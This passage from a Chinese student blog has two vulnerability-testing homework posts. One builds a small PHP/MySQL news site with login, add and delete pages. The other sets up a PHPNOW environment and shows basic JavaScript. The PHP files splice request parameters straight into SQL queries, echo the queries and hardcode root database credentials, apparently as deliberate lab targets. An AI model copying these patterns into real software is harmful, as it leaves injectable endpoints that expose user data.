<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/image-20200525152710754.png"  alt="image-20200525152710754"></p>
<p>创建表news(<u>newsid</u>,topic,content)和userinfo(<u>username</u>,password)</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十/image-20200525155422169.png"  alt="image-20200525155422169" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十/image-20200525153236706.png"  alt="image-20200525153236706" style="zoom:70%;">

<p>点击保存</p>
<h3 id="2-php文件编写"><a href="#2-php文件编写" class="headerlink" title="2.php文件编写"></a>2.php文件编写</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><ul>
<li>cellspacing 单元格间距，cellpadding 补白，是指单元格内文字与边框的距离;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=gb2312"</span> /&gt;</span><br><span class="line">&lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">  &lt;table width=<span class="string">"900"</span> border=<span class="string">"0"</span> cellspacing=<span class="string">"0"</span> cellpadding=<span class="string">"0"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"40"</span>&gt;&lt;form id=<span class="string">"form1"</span> name=<span class="string">"form1"</span> method=<span class="string">"post"</span> action=<span class="string">"loginok.php"</span>&gt;</span><br><span class="line">        &lt;div align=<span class="string">"right"</span>&gt;用户名：</span><br><span class="line">          &lt;input name=<span class="string">"username"</span> type=<span class="string">"text"</span> id=<span class="string">"username"</span> size=<span class="string">"12"</span> /&gt;</span><br><span class="line">          密码：</span><br><span class="line">          &lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> id=<span class="string">"password"</span> size=<span class="string">"12"</span> /&gt;</span><br><span class="line">          &lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> value=<span class="string">"提交"</span> /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;hr /&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"300"</span> align=<span class="string">"center"</span> valign=<span class="string">"top"</span>&gt;&lt;table width=<span class="string">"600"</span> border=<span class="string">"0"</span> cellspacing=<span class="string">"0"</span> cellpadding=<span class="string">"0"</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">          &lt;td width=<span class="string">"100"</span> height=<span class="string">"30"</span>&gt;&lt;div align=<span class="string">"center"</span>&gt;新闻序号&lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td&gt;&lt;div align=<span class="string">"center"</span>&gt;新闻标题&lt;/div&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      $SQLStr = <span class="string">"select * from news"</span>;</span><br><span class="line">      $result=mysql_db_query(<span class="string">"testDB"</span>, $SQLStr, $conn); </span><br><span class="line">      <span class="keyword">if</span> ($row=mysql_fetch_array($result))<span class="comment">//通过循环读取数据内容  </span></span><br><span class="line">      &#123; 	   </span><br><span class="line"> 	     <span class="comment">// 定位到第一条记录</span></span><br><span class="line">         mysql_data_seek($result, <span class="number">0</span>);</span><br><span class="line">         <span class="comment">// 循环取出记录</span></span><br><span class="line">         <span class="keyword">while</span> ($row=mysql_fetch_row($result))</span><br><span class="line">         &#123;  </span><br><span class="line"><span class="meta">?&gt;</span>        </span><br><span class="line"> &lt;tr&gt;</span><br><span class="line">          &lt;td height=<span class="string">"30"</span>&gt;&lt;div align=<span class="string">"center"</span>&gt; <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="number">0</span>] <span class="meta">?&gt;</span> &lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td&gt; &lt;div align=<span class="string">"center"</span>&gt; &lt;a href=<span class="string">"news.php?newsid=&lt;?php echo $row[0] ?&gt; "</span> &gt; <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="number">1</span>] <span class="meta">?&gt;</span>   &lt;/a&gt; &lt;/div&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">         &#125;</span><br><span class="line">       &#125;		</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">      &lt;/table&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    mysql_free_result($result);</span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    mysql_close($conn);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="news-php"><a href="#news-php" class="headerlink" title="news.php"></a>news.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=gb2312"</span> /&gt;</span><br><span class="line">&lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">  &lt;table width=<span class="string">"900"</span> border=<span class="string">"0"</span> cellspacing=<span class="string">"0"</span> cellpadding=<span class="string">"0"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"40"</span>&gt;&lt;form id=<span class="string">"form1"</span> name=<span class="string">"form1"</span> method=<span class="string">"post"</span> action=<span class="string">"loginok.php"</span>&gt;</span><br><span class="line">        &lt;div align=<span class="string">"right"</span>&gt;用户名：</span><br><span class="line">          &lt;input name=<span class="string">"username"</span> type=<span class="string">"text"</span> id=<span class="string">"username"</span> size=<span class="string">"12"</span> /&gt;</span><br><span class="line">          密码：</span><br><span class="line">          &lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> id=<span class="string">"password"</span> size=<span class="string">"12"</span> /&gt;</span><br><span class="line">          &lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> value=<span class="string">"提交"</span> /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;hr /&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"300"</span> align=<span class="string">"center"</span> valign=<span class="string">"top"</span>&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;</span><br><span class="line">	 <span class="meta">&lt;?php</span></span><br><span class="line">      $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>); </span><br><span class="line">      $newsid = $_GET[<span class="string">'newsid'</span>];</span><br><span class="line"></span><br><span class="line">      $SQLStr = <span class="string">"select * from news where newsid=$newsid"</span>;</span><br><span class="line">      $result=mysql_db_query(<span class="string">"testDB"</span>, $SQLStr, $conn); </span><br><span class="line">      <span class="keyword">if</span> ($row=mysql_fetch_array($result))<span class="comment">//通过循环读取数据内容  </span></span><br><span class="line">      &#123; 	   </span><br><span class="line"> 	     <span class="comment">// 定位到第一条记录</span></span><br><span class="line">         mysql_data_seek($result, <span class="number">0</span>);</span><br><span class="line">         <span class="comment">// 循环取出记录</span></span><br><span class="line">         <span class="keyword">while</span> ($row=mysql_fetch_row($result))</span><br><span class="line">         &#123;  </span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"$row[1]&lt;br&gt;"</span>;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"$row[2]&lt;br&gt;"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="comment">// 释放资源</span></span><br><span class="line">      mysql_free_result($result);</span><br><span class="line">      <span class="comment">// 关闭连接</span></span><br><span class="line">      mysql_close($conn);  </span><br><span class="line">       </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="loginok-php"><a href="#loginok-php" class="headerlink" title="loginok.php"></a>loginok.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	 <span class="meta">&lt;?php</span></span><br><span class="line"> 	    $loginok=<span class="number">0</span>;</span><br><span class="line">      $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>);   </span><br><span class="line">      $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">      $pwd = $_POST[<span class="string">'password'</span>];</span><br><span class="line">      $SQLStr = <span class="string">"SELECT * FROM userinfo where username='$username' and password='$pwd'"</span>; </span><br><span class="line">      <span class="keyword">echo</span> $SQLStr;</span><br><span class="line"></span><br><span class="line">      $result=mysql_db_query(<span class="string">"testDB"</span>, $SQLStr, $conn); </span><br><span class="line">      <span class="keyword">if</span> ($row=mysql_fetch_array($result))<span class="comment">//通过循环读取数据内容  </span></span><br><span class="line">      &#123;</span><br><span class="line">      	$loginok=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 释放资源</span></span><br><span class="line">      mysql_free_result($result);</span><br><span class="line">      <span class="comment">// 关闭连接</span></span><br><span class="line">      mysql_close($conn);        </span><br><span class="line">      <span class="keyword">if</span> ($loginok==<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"login succes"</span>);</span><br><span class="line">      		window.location.href=<span class="string">"sys.php"</span>;  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"login failed"</span>);</span><br><span class="line">      		history.back();  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sys-php"><a href="#sys-php" class="headerlink" title="sys.php"></a>sys.php</h4><p>注意，书中的添加新闻表格缺少newsid字段，导致插入失败</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=gb2312"</span> /&gt;</span><br><span class="line">&lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">  &lt;table width=<span class="string">"900"</span> border=<span class="string">"0"</span> cellspacing=<span class="string">"0"</span> cellpadding=<span class="string">"0"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"40"</span>&gt;&lt;form id=<span class="string">"form1"</span> name=<span class="string">"form1"</span> method=<span class="string">"post"</span> action=<span class="string">"add.php"</span>&gt;</span><br><span class="line">        &lt;div align=<span class="string">"right"</span>&gt;</span><br><span class="line">          &lt;label&gt;新闻序号 </span><br><span class="line">		    &lt;input type=<span class="string">"text"</span> name=<span class="string">"newsid"</span> id=<span class="string">"newsid"</span> size=<span class="string">"50"</span>/&gt;</span><br><span class="line">          新闻标题：</span><br><span class="line">          &lt;input name=<span class="string">"topic"</span> type=<span class="string">"text"</span> id=<span class="string">"topic"</span> size=<span class="string">"50"</span> /&gt;</span><br><span class="line">          &lt;BR&gt;</span><br><span class="line">          新闻内容：</span><br><span class="line">          &lt;textarea name=<span class="string">"content"</span> cols=<span class="string">"60"</span> rows=<span class="string">"8"</span> id=<span class="string">"content"</span>&gt;&lt;/textarea&gt;&lt;BR&gt;</span><br><span class="line">          &lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> value=<span class="string">"添加"</span> /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;hr /&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=<span class="string">"300"</span> align=<span class="string">"center"</span> valign=<span class="string">"top"</span>&gt;&lt;table width=<span class="string">"600"</span> border=<span class="string">"0"</span> cellspacing=<span class="string">"0"</span> cellpadding=<span class="string">"0"</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">          &lt;td width=<span class="string">"100"</span> height=<span class="string">"30"</span>&gt;&lt;div align=<span class="string">"center"</span>&gt;新闻序号&lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td&gt;&lt;div align=<span class="string">"center"</span>&gt;新闻标题&lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td&gt;&lt;div align=<span class="string">"center"</span>&gt;删除&lt;/div&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      $SQLStr = <span class="string">"select * from news"</span>;</span><br><span class="line">      $result=mysql_db_query(<span class="string">"testDB"</span>, $SQLStr, $conn); </span><br><span class="line">      <span class="keyword">if</span> ($row=mysql_fetch_array($result))<span class="comment">//通过循环读取数据内容  </span></span><br><span class="line">      &#123; 	   </span><br><span class="line"> 	    <span class="comment">// 定位到第一条记录</span></span><br><span class="line">         mysql_data_seek($result, <span class="number">0</span>);</span><br><span class="line">         <span class="comment">// 循环取出记录</span></span><br><span class="line">         <span class="keyword">while</span> ($row=mysql_fetch_row($result))</span><br><span class="line">         &#123;  </span><br><span class="line"><span class="meta">?&gt;</span>        </span><br><span class="line"> &lt;tr&gt;</span><br><span class="line">          &lt;td height=<span class="string">"30"</span>&gt;&lt;div align=<span class="string">"center"</span>&gt; <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="number">0</span>] <span class="meta">?&gt;</span> &lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td width=<span class="string">"400"</span>&gt; &lt;div align=<span class="string">"center"</span>&gt; <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="number">1</span>] <span class="meta">?&gt;</span>   &lt;/div&gt;&lt;/td&gt;</span><br><span class="line">          &lt;td&gt;&lt;div align=<span class="string">"center"</span>&gt;&lt;a href=<span class="string">"del.php?newsid=&lt;?php echo $row[0] ?&gt; "</span> &gt;  删除 &lt;/a&gt; &lt;/div&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">         &#125;</span><br><span class="line">       &#125;		</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">      &lt;/table&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    mysql_free_result($result);</span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    mysql_close($conn);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="add-php"><a href="#add-php" class="headerlink" title="add.php"></a>add.php</h4><p>注意添加newsid参数接收</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	 <span class="meta">&lt;?php</span> </span><br><span class="line">      $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>);   </span><br><span class="line">      mysql_select_db(<span class="string">"testDB"</span>);  </span><br><span class="line">	  $newsid=$_POST[<span class="string">'newsid'</span>];    </span><br><span class="line">      $topic = $_POST[<span class="string">'topic'</span>];</span><br><span class="line">      $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">      $SQLStr = <span class="string">"insert into news(newsid,topic, content) values('$newsid','$topic', '$content')"</span>; </span><br><span class="line">      <span class="keyword">echo</span> $SQLStr; </span><br><span class="line">      $result=mysql_query($SQLStr);</span><br><span class="line">       </span><br><span class="line">      <span class="comment">// 关闭连接</span></span><br><span class="line">      mysql_close($conn);        </span><br><span class="line">      <span class="keyword">if</span> ($result)</span><br><span class="line">      &#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"insert succes"</span>);</span><br><span class="line">      		window.location.href=<span class="string">"sys.php"</span>;  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"insert failed"</span>);</span><br><span class="line">      		history.back();  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="del-php"><a href="#del-php" class="headerlink" title="del.php"></a>del.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	 <span class="meta">&lt;?php</span> </span><br><span class="line">      $conn=mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>);  </span><br><span class="line">      mysql_select_db(<span class="string">"testDB"</span>);       </span><br><span class="line">      $newsid = $_GET[<span class="string">'newsid'</span>]; </span><br><span class="line">      $SQLStr = <span class="string">"delete from news where newsid=$newsid"</span>;  </span><br><span class="line">      <span class="keyword">echo</span> $SQLStr;</span><br><span class="line">      $result=mysql_query($SQLStr);       </span><br><span class="line">      <span class="comment">// 关闭连接</span></span><br><span class="line">      mysql_close($conn);        </span><br><span class="line">      <span class="keyword">if</span> ($result)</span><br><span class="line">      &#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"delete succes"</span>);</span><br><span class="line">      		window.location.href=<span class="string">"sys.php"</span>;  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">      	<span class="meta">?&gt;</span></span><br><span class="line">      	&lt;script&gt; </span><br><span class="line">      		alert(<span class="string">"delete failed"</span>);</span><br><span class="line">      		history.back();  </span><br><span class="line">      	&lt;/script&gt;</span><br><span class="line">      	 <span class="meta">&lt;?php</span></span><br><span class="line">      &#125;       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528115751130.png"  alt="image-20200528115751130" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528115817818.png"  alt="image-20200528115817818" style="zoom:50%;">



<p>向数据库插入数据之后</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528120742829.png"  alt="image-20200528120742829" style="zoom:67%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528120816118.png"  alt="image-20200528120816118" style="zoom:67%;">



<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528121334231.png"  alt="image-20200528121334231" style="zoom:67%;">



<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528122834809.png"  alt="image-20200528121402000" style="zoom:67%;">



<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528123219164.png"  alt="image-20200528123219164" style="zoom:50%;">

<p>点击删除</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/images\漏测作业十\image-20200528123237519.png"  alt="image-20200528123237519" style="zoom:50%;">]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>漏洞测试</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业九：Javascript实践</title>
    <url>/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B9%9D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note primary no-icon">
            <ul><li><p>web开发</p></li><li><p>javascript</p></li></ul>
          </div>

<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>搭建PHPNOW的开发环境，然后制作一个Html页面，并利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="PHPNOW环境搭建"><a href="#PHPNOW环境搭建" class="headerlink" title="PHPNOW环境搭建"></a>PHPNOW环境搭建</h3><p>系统：windows xp</p>
<ol>
<li>将压缩包解压后，粘贴到虚拟机内，点击<code>setup</code>,选择需要的Apache和MySql版本，我这里选择的是20和50，执行解压</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516153854958.png"  alt="image-20200516153854958" style="zoom:80%;">

<ol start="2">
<li><p>输入y，进行初始化，设置mysql密码，这里设置为<code>123456</code></p>
</li>
<li><p>设置完成：</p>
</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516154215571.png"  alt="image-20200516154215571" style="zoom:67%;">

<ol start="4">
<li>输入密码，点击连接，测试成功</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516154255395.png"  alt="image-20200516154255395" style="zoom:80%;">

<ol start="5">
<li>点击<code>phpMyAdmin</code>,进入数据库管理页面，输入用户名<code>root</code>,密码<code>123456</code></li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516154607932.png"  alt="image-20200516154607932" style="zoom: 80%;">

<ol start="6">
<li>安装成功</li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B9%9D/image-20200516154750901.png"  alt="image-20200516154750901"></p>
<h3 id="制作Html页面"><a href="#制作Html页面" class="headerlink" title="制作Html页面"></a>制作Html页面</h3><h4 id="内容学习"><a href="#内容学习" class="headerlink" title="内容学习"></a>内容学习</h4><ol>
<li><p>安装Dreamweaver</p>
</li>
<li><p>htdocs文件夹为当前网站工作的根目录，在该目录先新建文件<code>js.htm</code>,并用Dreamweaver打开</p>
</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516155445950.png"  alt="image-20200516155445950" style="zoom:67%;">



<ol start="3">
<li><p>一个简单的html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript example!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">1111</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516160957627.png"  alt="image-20200516160957627" style="zoom: 50%;">
</li>
<li><p>document.write()函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript简单示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line">            for(i=1;i&lt;=100;i++)&#123;</span><br><span class="line"><span class="javascript">                num=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">100</span>);<span class="comment">//0-99之间的随机数</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(num,<span class="string">" "</span>);<span class="comment">//向body区域写入内容</span></span></span><br><span class="line">            &#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业九/image-20200516161610190.png"  alt="image-20200516161610190" style="zoom:80%;">
</li>
<li><p>函数调用</p>
</li>
</ol>
